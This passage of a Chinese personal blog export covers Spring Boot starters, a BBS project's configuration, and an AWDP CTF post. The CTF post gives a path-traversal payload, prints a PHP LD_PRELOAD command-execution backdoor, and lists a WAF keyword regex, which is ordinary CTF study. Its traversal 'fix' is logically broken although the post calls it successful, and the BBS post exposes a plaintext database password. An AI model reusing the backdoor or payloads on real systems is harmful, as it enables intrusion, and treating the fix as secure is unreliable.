class="name">dependencies</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- Import dependency management from Spring Boot -</span></span><br><span class="line"><span class="comment">-&gt;</span></span><br><span class="line"><span class="comment">&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span></span><br><span class="line"><span class="comment">&lt;artifactId&gt;spring-boot-dependencies&lt;/artifactId&gt;</span></span><br><span class="line"><span class="comment">&lt;version&gt;2.0.0.RELEASE&lt;/version&gt;</span></span><br><span class="line"><span class="comment">&lt;type&gt;pom&lt;/type&gt;</span></span><br><span class="line"><span class="comment">&lt;scope&gt;import&lt;/scope&gt;</span></span><br><span class="line"><span class="comment">&lt;/dependency&gt;</span></span><br><span class="line"><span class="comment">&lt;/dependencies&gt;</span></span><br><span class="line"><span class="comment">&lt;/dependencyManagement&gt;</span></span><br></pre></td></tr></table></figure><h4 id="使用Spring-Boot-Maven插件">使用Spring Boot Maven插件</h4><p>Spring Boot包含一个Maven插件， 它可以将项目打包成一个可执行jar。 如果想使用<br>它， 你可以将该插件添加到 <plugins> 节点处：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="Starters">Starters</h4><p>Starters是一个依赖描述符的集合， 你可以将它包含进项目中， 这样添加依赖就非<br>常方便。 你可以获取所有Spring及相关技术的一站式服务， 而不需要翻阅示例代<br>码， 拷贝粘贴大量的依赖描述符。 例如， 如果你想使用Spring和JPA进行数据库访<br>问， 需要在项目中包含 spring-boot-starter-data-jpa 依赖。</p><p>表 13.1. Spring Boot application starters</p><table><thead><tr><th>名称</th><th>描述</th><th>Pom</th></tr></thead><tbody><tr><td>spring-boot-starter</td><td>核心starter， 包括自动配置支持， 日志和YAML</td><td>Pom</td></tr><tr><td>spring-boot-starter activemq</td><td>用于使用Apache ActiveMQ实现JMS消息</td><td>Pom</td></tr><tr><td>spring-boot-starter amqp</td><td>用于使用Spring AMQP和Rabbit MQ</td><td>Pom</td></tr><tr><td>spring-boot-starter aop</td><td>用于使用Spring AOP和AspectJ实现面向切面 编程</td><td>Pom</td></tr><tr><td>spring-boot-starter artemis</td><td>使用Apache Artemis实现JMS消息</td><td>Pom</td></tr><tr><td>spring-boot-starter batch</td><td>对Spring Batch的支持</td><td>Pom</td></tr></tbody></table><p>13.5. Starters<br>71</p><table><thead><tr><th>spring-boot-starter cache</th><th>用于使用Spring框架的缓存支持</th><th>Pom</th></tr></thead><tbody><tr><td>spring-boot-starter cloud-connectors</td><td>对Spring Cloud Connectors的支持， 用于简化 云平台下（ 例如Cloud Foundry 和Heroku） 服 务的连接</td><td>Pom</td></tr><tr><td>spring-boot-starter data-cassandra</td><td>用于使用分布式数据库Cassandra和Spring Data Cassandra</td><td>Pom</td></tr><tr><td>spring-boot-starter data-cassandra reactive</td><td>用于使用分布式数据库Cassandra和Spring Data Cassandra Reactive</td><td>Pom</td></tr><tr><td>spring-boot-starter data-couchbase</td><td>用于使用基于文档的数据库Couchbase和 Spring Data Couchbase</td><td>Pom</td></tr><tr><td>spring-boot-starter data-couchbase reactive</td><td>用于使用基于文档的数据库Couchbase和 Spring Data Couchbase Reactive</td><td>Pom</td></tr><tr><td>spring-boot-starter data-elasticsearch</td><td>用于使用Elasticsearch搜索， 分析引擎和 Spring Data Elasticsearch</td><td>Pom</td></tr><tr><td>spring-boot-starter data-jpa</td><td>用于使用Hibernate实现Spring Data JPA</td><td>Pom</td></tr><tr><td>spring-boot-starter data-ldap</td><td>用于Spring Data LDAP</td><td>Pom</td></tr><tr><td>spring-boot-starter data-mongodb</td><td>用于使用基于文档的数据库MongoDB和Spring Data MongoDB</td><td>Pom</td></tr><tr><td>spring-boot-starter data-mongodb reactive</td><td>用于使用基于文档的数据库MongoDB和Spring Data MongoDB Reactive</td><td>Pom</td></tr><tr><td>spring-boot-starter data-neo4j</td><td>用于使用图数据库Neo4j和Spring Data Neo4j</td><td>Pom</td></tr><tr><td>spring-boot-starter data-redis</td><td>用于使用Spring Data Redis和Lettuce客户端操 作键-值存储的Redis</td><td>Pom</td></tr><tr><td>spring-boot-starter data-redis-reactive</td><td>用于使用Spring Data Redis reactive和Lettuce 客户端操作键-值存储的Redis</td><td>Pom</td></tr><tr><td>spring-boot-starter data-rest</td><td>用于使用Spring Data REST暴露基于REST的 Spring Data仓库</td><td>Pom</td></tr><tr><td>spring-boot-starter data-solr</td><td>通过Spring Data Solr使用Apache Solr搜索平 台</td><td>Pom</td></tr><tr><td>spring-boot-starter freemarker</td><td>用于使用FreeMarker模板引擎构建MVC web应 用</td><td>Pom</td></tr></tbody></table><p>13.5. Starters<br>72</p><table><thead><tr><th>spring-boot-starter groovy-templates</th><th>用于使用Groovy模板引擎构建MVC web应用</th><th>Pom</th></tr></thead><tbody><tr><td>spring-boot-starter hateoas</td><td>用于使用Spring MVC和Spring HATEOAS实现 基于超媒体的RESTful web应用</td><td>Pom</td></tr><tr><td>spring-boot-starter integration</td><td>用于使用Spring Integration</td><td>Pom</td></tr><tr><td>spring-boot-starter jdbc</td><td>对JDBC的支持（ 使用Tomcat JDBC连接池）</td><td>Pom</td></tr><tr><td>spring-boot-starter jersey</td><td>用于使用JAX-RS和Jersey构建RESTful web应 用， 可使用spring-boot-starter-web替代</td><td>Pom</td></tr><tr><td>spring-boot-starter jooq</td><td>用于使用JOOQ访问SQL数据库， 可使 用spring-boot-starter-data-jpa或spring-boot starter-jdbc替代</td><td>Pom</td></tr><tr><td>spring-boot-starter json</td><td>用于读写json</td><td>Pom</td></tr><tr><td>spring-boot-starter jta-atomikos</td><td>用于使用Atomikos实现JTA事务</td><td>Pom</td></tr><tr><td>spring-boot-starter jta-bitronix</td><td>用于使用Bitronix实现JTA事务</td><td>Pom</td></tr><tr><td>spring-boot-starter jta-narayana</td><td>Spring Boot Narayana JTA Starter</td><td>Pom</td></tr><tr><td>spring-boot-starter mail</td><td>用于使用Java Mail和Spring框架email发送支持</td><td>Pom</td></tr><tr><td>spring-boot-starter mustache</td><td>用于使用Mustache模板引擎构建MVC web应用</td><td>Pom</td></tr><tr><td>spring-boot-starter quartz</td><td>Spring Boot Quartz Starter</td><td>Pom</td></tr><tr><td>spring-boot-starter security</td><td>对Spring Security的支持</td><td>Pom</td></tr><tr><td>spring-boot-starter security-reactive</td><td>对响应式Spring Security的支持</td><td>Pom</td></tr><tr><td>spring-boot-starter test</td><td>用于测试Spring Boot应用， 支持常用测试类 库， 包括JUnit, Hamcrest和Mockito</td><td>Pom</td></tr><tr><td>spring-boot-starter thymeleaf</td><td>用于使用Thymeleaf模板引擎构建MVC web应 用</td><td>Pom</td></tr><tr><td>spring-boot-starter validation</td><td>用于使用Hibernate Validator实现Java Bean校 验</td><td>Pom</td></tr></tbody></table><p>13.5. Starters<br>73</p><table><thead><tr><th>spring-boot-starter web</th><th>用于使用Spring MVC构建web应用， 包括 RESTful。 Tomcat是默认的内嵌容器</th><th>Pom</th></tr></thead><tbody><tr><td>spring-boot-starter web-services</td><td>对Spring Web服务的支持</td><td>Pom</td></tr><tr><td>spring-boot-starter webflux</td><td>提供用Spring框架创建webflux应用的支持</td><td>Pom</td></tr><tr><td>spring-boot-starter websocket</td><td>用于使用Spring框架的WebSocket支持构建 WebSocket应用</td><td>Pom</td></tr></tbody></table><p>除了应用程序starters， 以下starters可用于添加production ready的功能：<br>表 13.2. Spring Boot生产级starters</p><table><thead><tr><th>名称</th><th>描述</th><th>Pom</th></tr></thead><tbody><tr><td>spring-boot starter actuator</td><td>用于使用Spring Boot的Actuator， 它提供了 production ready功能来帮助你监控和管理应用程序</td><td>Pom</td></tr></tbody></table><p>最后， Spring Boot还包含以下用于排除或交换某些特定技术方面的starters：<br>表 13.3. Spring Boot技术性starters</p><table><thead><tr><th>名称</th><th>描述</th><th>Pom</th></tr></thead><tbody><tr><td>spring-boot starter-jetty</td><td>用于使用Jetty作为内嵌servlet容器， 可使 用spring-boot-starter-tomcat替代</td><td>Pom</td></tr><tr><td>spring-boot starter-log4j2</td><td>用于使用Log4j2记录日志， 可使用spring-boot starter-logging代替</td><td>Pom</td></tr><tr><td>spring-boot starter-logging</td><td>用于使用Logback记录日志， 默认的日志starter</td><td>Pom</td></tr><tr><td>spring-boot starter-reactor netty</td><td>使用Reactor Netty做为内嵌的HTTP服务器</td><td>Pom</td></tr><tr><td>spring-boot starter-tomcat</td><td>用于使用Tomcat作为内嵌servlet容器， spring boot-starter-web使用的默认servlet容器</td><td>Pom</td></tr><tr><td>spring-boot starter-undertow</td><td>用于使用Undertow作为内嵌servlet容器， 可使 用spring-boot-starter-tomcat替代</td><td>Pom</td></tr></tbody></table><p>注： 查看GitHub上位于 spring-boot-starters 模块内的README文件， 可以获<br>取到一个社区贡献的其他starters列表。</p><h3 id="组织你的代码">组织你的代码</h3><h4 id="default包">default包</h4><p>当类没有声明 package 时， 它被认为处于 default package 下。 通常不推荐使<br>用 default package ， 因为对于使<br>用 @ComponentScan ， @EntityScan 或 @SpringBootApplication 注解的<br>Spring Boot应用来说， 它会扫描每个jar中的类， 这会造成一定的问题。<br>注 我们建议你遵循Java推荐的包命名规范， 使用一个反转的域名（ 例<br>如 com.example.project ） 。</p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
            <tag> spring boot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>awdp测试</title>
      <link href="/2024/06/17/awdp/"/>
      <url>/2024/06/17/awdp/</url>
      
        <content type="html"><![CDATA[<h1>介绍</h1><p>首先了解一下什么是 AWDP ，AWDP模式（Attack,Defense,WebandPwn），分为 Break 与 Fix 环节。根据英文全称也可以看出来，只有 Web 和 Pwn 这两个方向的题目。</p><p>每个战队拥有相同的起始分数及相同配置的虚拟靶机，参赛队员需对平台中的GameBox发起攻击，向平台提交正确的flag（证明自己具备对该题的攻击能力）；在此期间，由平台以轮次制的方式向参赛战队的靶机发起攻击，检查其他选手的漏洞是否修补成功，若修补成功则认为参赛战队具备该漏洞的防御能力。</p><p>简单来说，AWDP 和传统 CTF 并无任何区别，仅仅是多了一个 Fix 功能，也就是你提交 flag 后拿到的是攻击分，而 Fix 成功后才会拿到防御分</p><p>首先，主办方会给你一个ftp让你连到服务器上，你可以传一个update.tar.gz，里面应当包含一个文件，<a href="http://xn--update-9m7igl098q3j3e.sh">还有一个update.sh</a>，然后这个update.sh里面就是你要执行的命令，这里的修复主要讲的就是你用修改了的文件替换原有题目的文件，然后update.sh的内容比如就是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"></span><br><span class="line">cp index.php /var/www/html/index.php</span><br></pre></td></tr></table></figure><p>路径啥的主办方是会给你的，打包命令就是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar zcvf update.tar.gz update.sh file1 file2</span><br></pre></td></tr></table></figure><h1>例题</h1><ol><li></li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">        <span class="variable">$action</span> = (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>] : <span class="string">&#x27;home.php&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$action</span>)) &#123;</span><br><span class="line">            <span class="keyword">include</span> <span class="variable">$action</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;File not found!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>payload: <code>?action=../../../../flag</code></p><p>fix:黑名单防御</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">        <span class="variable">$action</span> = (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>] : <span class="string">&#x27;home.php&#x27;</span>);</span><br><span class="line"><span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;..&quot;</span>,<span class="string">&quot;../&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$action</span>, <span class="variable">$deny_ext</span>))&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$action</span>)) &#123;</span><br><span class="line">                <span class="keyword">include</span> <span class="variable">$action</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;File not found!&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里通过新建一个黑名单，过滤…和…/的方法防御成功</p><ol start="2"><li></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    echo &quot;&lt;p&gt; &lt;b&gt;example&lt;/b&gt;: http://site.com/bypass_disablefunc.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/bypass_disablefunc_x64.so &lt;/p&gt;&quot;;</span><br><span class="line"></span><br><span class="line">    $cmd = $_GET[&quot;cmd&quot;];</span><br><span class="line">    $out_path = $_GET[&quot;outpath&quot;];</span><br><span class="line">    $evil_cmdline = $cmd . &quot; &gt; &quot; . $out_path . &quot; 2&gt;&amp;1&quot;;</span><br><span class="line">    echo &quot;&lt;p&gt; &lt;b&gt;cmdline&lt;/b&gt;: &quot; . $evil_cmdline . &quot;&lt;/p&gt;&quot;;</span><br><span class="line"></span><br><span class="line">    putenv(&quot;EVIL_CMDLINE=&quot; . $evil_cmdline);</span><br><span class="line"></span><br><span class="line">    $so_path = $_GET[&quot;sopath&quot;];</span><br><span class="line">    putenv(&quot;LD_PRELOAD=&quot; . $so_path);</span><br><span class="line"></span><br><span class="line">    mail(&quot;&quot;, &quot;&quot;, &quot;&quot;, &quot;&quot;);</span><br><span class="line"></span><br><span class="line">    echo &quot;&lt;p&gt; &lt;b&gt;output&lt;/b&gt;: &lt;br /&gt;&quot; . nl2br(file_get_contents($out_path)) . &quot;&lt;/p&gt;&quot;; </span><br><span class="line"></span><br><span class="line">    unlink($out_path);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>扫出一个后门，发现应该是个劫持LD_PRELOAD，然后根据格式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://site.com/bypass_disablefunc.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/bypass_disablefunc_x64.so</span><br></pre></td></tr></table></figure><p>2.防御正则：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function waf($s)&#123;</span><br><span class="line">  if (preg_match(&quot;/select|flag|union|\\\\$|\&#x27;|\&quot;|--|#|\\0|into|alert|img|prompt|set|/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\%|\&lt;|\&gt;|\^|\x00|\#|\x23|[0-9]|file|\=|or|\x7c|select|and|flag|into|where|\x26|\&#x27;|\&quot;|union|\`|sleep|benchmark|regexp|from|count|procedure|and|ascii|substr|substring|left|right|union|if|case|pow|exp|order|sleep|benchmark|into|load|outfile|dumpfile|load_file|join|show|select|update|set|concat|delete|alter|insert|create|union|or|drop|not|for|join|is|between|group_concat|like|where|user|ascii|greatest|mid|substr|left|right|char|hex|ord|case|limit|conv|table|mysql_history|flag|count|rpad|\&amp;|\*|\.|/is&quot;,$s)||strlen($s)&gt;50)&#123;</span><br><span class="line">    header(&quot;Location: /&quot;);</span><br><span class="line">    die();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>3</p><p>.一般java题漏洞都出现在依赖里，查看pom.xml,发现里面的fastjson是1.2.55的，总所周知，这个版本肯定是存在漏洞的，把依赖的版本修改为新版本1.2.83，然后再maven打包，就防御成功了。</p><p>4.linux 运行checksec命令</p><p>5.补丁工具patch：</p><p>为单个文件生成补丁</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">diff -up origin.c modify.c</span><br></pre></td></tr></table></figure><p>先进性对比</p><ul><li>-u 显示有差异行的前后几行(上下文), 默认是前后各3行, 这样, patch中带有更多的信息.</li><li>-p 显示代码所在的c函数的信息.</li></ul><p>回显：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">--- ssh 2024-06-05 02:06:37.188949705 -0400</span><br><span class="line">+++ &quot;ssh (\345\244\215\345\210\266 1)&quot;  2024-06-19 05:36:34.479623854 -0400</span><br><span class="line">@@ -18,3 +18,4 @@ 重启SSH服务</span><br><span class="line"> </span><br><span class="line"> sudo service sshd restart</span><br><span class="line"> sudo systemctl restart sshd.service</span><br><span class="line">+1111</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">diff -uprN origin/ modify/</span><br></pre></td></tr></table></figure><p>这条命令对比了origin/和modify/两个目录下的所有源码差异.</p><p>参数详解:</p><ul><li>-r 递归地对比一个目录和它的所有子目录(即整个目录树).</li><li>-N 如果某个文件缺少了, 就当作是空文件来对比. 如果不使用本选项, 当diff发现旧代码或者新代码缺少文件时, 只简单的提示缺少文件. 如果使用本选项, 会将新添加的文件全新打印出来作为新增的部分.</li></ul><p>打补丁：</p><p>生成的补丁中, 路径信息包含了你的源码根目录的名称, 但其他人的源码根目录可能是其它名字, 所以, 打补丁时, 要进入你的源码根目录, 并且告诉patch工具, 请忽略补丁中的路径的第一级目录(参数-p1).</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">patch -p1 &lt; patch1.diff</span><br></pre></td></tr></table></figure><p>给修改过的内核生成patch，然后用生成的patch给未修改过的内核打补丁</p><p>其中，目录linux-2.6.31.3为未修改过的内核，目录linux-2.6.31.3_1为修改过的内核</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ diff -uparN linux-2.6.31.3 linux-2.6.31.3_1/ &gt; mypatch</span><br><span class="line">$ cd linux-2.6.31.3</span><br><span class="line">$ patch -p1 &lt; mypatch</span><br></pre></td></tr></table></figure><p><a href="https://cloud.tencent.com/developer/tools/blog-entry?target=http%3A%2F%2Fcdn.jsdelivr.net%2Fgh%2Fhongweifuture%2Fhongweifuture.github.io%2Fmedias%2Ffeatureimages%2F&amp;source=article&amp;objectId=1952241">http://cdn.jsdelivr.net/gh/hongweifuture/hongweifuture.github.io/medias/featureimages/</a>12.jpg</p>]]></content>
      
      
      <categories>
          
          <category> awdp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>欧洲杯</title>
      <link href="/2024/06/17/football/"/>
      <url>/2024/06/17/football/</url>
      
        <content type="html"><![CDATA[<p>看了欧洲杯昨天竟然爆了两个冷门，我卡库是真的难受，六过家门而不入。劳内也是真的难受啊。。。</p>]]></content>
      
      
      <categories>
          
          <category> life </category>
          
      </categories>
      
      
        <tags>
            
            <tag> football </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>bbs项目设计</title>
      <link href="/2024/06/12/bbs%20web/"/>
      <url>/2024/06/12/bbs%20web/</url>
      
        <content type="html"><![CDATA[<ol><li><h2 id="数据库设计：">数据库设计：</h2></li></ol><p>- 设计数据库表结构，定义数据字段和类型。</p><p>- 使用SQL进行数据库创建和管理。</p><p>```<img src="https://img.mengnankk.asia/img/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20240613195841.png" alt=""></p><ol start="2"><li>数据插入和查询：</li></ol><p><img src="https://img.mengnankk.asia/img/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20240613195735.png" alt=""></p><p>数据库优化:</p><p>为了提高查询性能，我花了大量时间研究数据库优化技术，包括索引的使用、查询优化和数据库分区。</p><p><img src="https://img.mengnankk.asia/img/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20240613195732.png" alt=""></p><p>数据库配置：</p><p><img src="https://img.mengnankk.asia/img/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20240613200414.png" alt=""></p><h2 id="博客模块">博客模块</h2><p>采用了hexo 博客，但因为总是换主题不喜欢butterfly导致blog崩溃和代码git出现问题，blog已经重置了</p><p>简述</p><ol><li>博客文章管理：采用_post发送blog</li></ol><h2 id="安全模块">安全模块</h2><p>简述</p><p>在安全模块中，我实现了用户认证和授权机制，确保系统的安全性。</p><ol><li>用户认证：</li></ol><p>- 实现用户注册、登录和密码加密。</p><p><img src="https://img.mengnankk.asia/img/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20240613195729.png" alt=""></p><h2 id="Git代码管理模块">Git代码管理模块</h2><p>简述</p><p>在这个模块中，我负责管理和维护代码仓库，使用Git进行版本控制，并与团队协作开发。</p><ol><li>初始化和配置Git仓库：</li></ol><p>- 初始化Git仓库，配置远程仓库。</p><p><img src="https://img.mengnankk.asia/img/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20240613195727.png" alt=""></p><ol start="2"><li>分支管理和合并：</li></ol><p>- 创建新分支、合并分支以及解决冲突。</p><p><img src="https://img.mengnankk.asia/img/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20240613195718.png" alt=""></p><p>这些模块和任务展示了我在数据库、博客、安全和Git代码管理方面的工作和研究，数据库优化是重点</p>]]></content>
      
      
      <categories>
          
          <category> sql </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>bbs sql</title>
      <link href="/2024/06/06/bbs/"/>
      <url>/2024/06/06/bbs/</url>
      
        <content type="html"><![CDATA[<h2 id="数据库">数据库</h2><p>根据实际情况选择数据库，选择的是mysql version 为 8.0.37 MySQL Community Server</p><p>在resources下application.properties文件里规定服务器的各类配置</p><h4 id="服务器配置">服务器配置</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">properties复制代码server.port=8080</span><br><span class="line">spring.thymeleaf.cache=false</span><br></pre></td></tr></table></figure><ul><li><code>server.port=8080</code>：指定Spring Boot应用运行的端口号为8080。</li><li><code>spring.thymeleaf.cache=false</code>：禁用Thymeleaf模板的缓存，以便在开发过程中实时查看更改效果。</li></ul><h4 id="数据源配置">数据源配置</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">properties复制代码spring.datasource.name=my-bbs-datasource</span><br><span class="line">spring.datasource.driverClassName=com.mysql.cj.jdbc.Driver</span><br><span class="line">spring.datasource.url=jdbc:mysql://localhost:3306/my_bbs_db?useUnicode=true&amp;serverTimezone=Asia/Shanghai&amp;characterEncoding=utf8&amp;autoReconnect=true&amp;useSSL=false&amp;allowMultiQueries=true</span><br><span class="line">spring.datasource.username=Margit</span><br><span class="line">spring.datasource.password=8750613a</span><br></pre></td></tr></table></figure><ul><li><code>spring.datasource.name=my-bbs-datasource</code>：数据源的名称。</li><li><code>spring.datasource.driverClassName=com.mysql.cj.jdbc.Driver</code>：指定MySQL JDBC驱动。</li><li><code>spring.datasource.url=jdbc:mysql://localhost:3306/my_bbs_db?useUnicode=true&amp;serverTimezone=Asia/Shanghai&amp;characterEncoding=utf8&amp;autoReconnect=true&amp;useSSL=false&amp;allowMultiQueries=true</code>：数据库连接的URL，包含了字符编码、时区、SSL等配置。</li><li><code>spring.datasource.username=Margit</code>：数据库用户名。</li><li><code>spring.datasource.password=8750613a</code>：数据库密码。</li></ul><h4 id="HikariCP连接池配置">HikariCP连接池配置</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">properties复制代码spring.datasource.hikari.minimum-idle=5</span><br><span class="line">spring.datasource.hikari.maximum-pool-size=15</span><br><span class="line">spring.datasource.hikari.auto-commit=true</span><br><span class="line">spring.datasource.hikari.idle-timeout=60000</span><br><span class="line">spring.datasource.hikari.pool-name=hikariCP</span><br><span class="line">spring.datasource.hikari.max-lifetime=600000</span><br><span class="line">spring.datasource.hikari.connection-timeout=30000</span><br><span class="line">spring.datasource.hikari.connection-test-query=SELECT 1</span><br></pre></td></tr></table></figure><ul><li><code>spring.datasource.hikari.minimum-idle=5</code>：连接池中最小空闲连接数。</li><li><code>spring.datasource.hikari.maximum-pool-size=15</code>：连接池中最大连接数。</li><li><code>spring.datasource.hikari.auto-commit=true</code>：设置自动提交。</li><li><code>spring.datasource.hikari.idle-timeout=60000</code>：连接空闲时间（毫秒），超过该时间连接将被释放。</li><li><code>spring.datasource.hikari.pool-name=hikariCP</code>：连接池名称。</li><li><code>spring.datasource.hikari.max-lifetime=600000</code>：连接的最大生命周期（毫秒），超过该时间连接将被关闭。</li><li><code>spring.datasource.hikari.connection-timeout=30000</code>：等待连接的最大时间（毫秒）。</li><li><code>spring.datasource.hikari.connection-test-query=SELECT 1</code>：测试连接的SQL查询。</li></ul><h4 id="MyBatis配置">MyBatis配置</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">properties</span><br><span class="line">复制代码</span><br><span class="line">mybatis.mapper-locations=classpath:mapper/*Mapper.xml</span><br></pre></td></tr></table></figure><ul><li><code>mybatis.mapper-locations=classpath:mapper/*Mapper.xml</code>：指定MyBatis的Mapper文件位置。</li></ul><h4 id="日志配置">日志配置</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">properties</span><br><span class="line">复制代码</span><br><span class="line">logging.level.com.my.bbs.dao=debug</span><br></pre></td></tr></table></figure><ul><li><code>logging.level.com.my.bbs.dao=debug</code>：设置包<code>com.my.bbs.dao</code>下的日志级别为<code>debug</code>，便于调试。</li></ul><p>确保数据安全和防止数据丢失，要进行date的备份，使用<code>mysqldump</code>工具备份MySQL数据库：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 